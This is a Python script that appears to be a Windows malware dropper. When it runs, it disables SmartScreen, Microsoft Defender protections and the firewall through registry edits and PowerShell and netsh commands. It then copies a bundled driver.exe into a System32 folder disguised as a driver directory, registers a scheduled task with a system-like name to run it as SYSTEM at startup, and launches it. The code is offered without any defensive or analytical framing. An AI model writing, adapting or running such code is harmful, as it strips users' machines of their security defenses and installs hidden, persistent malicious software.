import subprocess
import winreg
import os
import shutil
from sys import exit

dest_path = 'C:/Windows/System32/drivers/sys'


def build(src_file):
    if not os.path.exists(dest_path):
        os.makedirs(dest_path)
    subprocess.call(f'SCHTASKS /CREATE /SC ONSTART /RU "NT AUTHORITY\SYSTEM" /TN "Microsoft\Windows\Windows Driver\Driver" /TR "{dest_path}/driver.exe"')

    shutil.move(f'{src_file}/driver.exe', f'{dest_path}/driver.exe')


def av_bypass():
    # disable windows smartscreen
    path = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0,winreg.KEY_WRITE)
    winreg.SetValueEx(path, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off")

    # disable AV in general
    subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)
    subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .tmp", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection disable", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableIOAVProtection $true", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisablePrivacyMode $true", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableArchiveScanning $true", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $true", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -ModerateThreatDefaultAction 6", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -ScanScheduleDay 8", shell=True)
    subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state off", shell=True)


def resource_path():
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except:
        base_path = os.path.abspath(".")

    return base_path


if not os.path.isfile(f'{dest_path}/driver.exe'):
    av_bypass()
    build(resource_path())
    subprocess.call(f"{dest_path}/driver.exe")
    exit()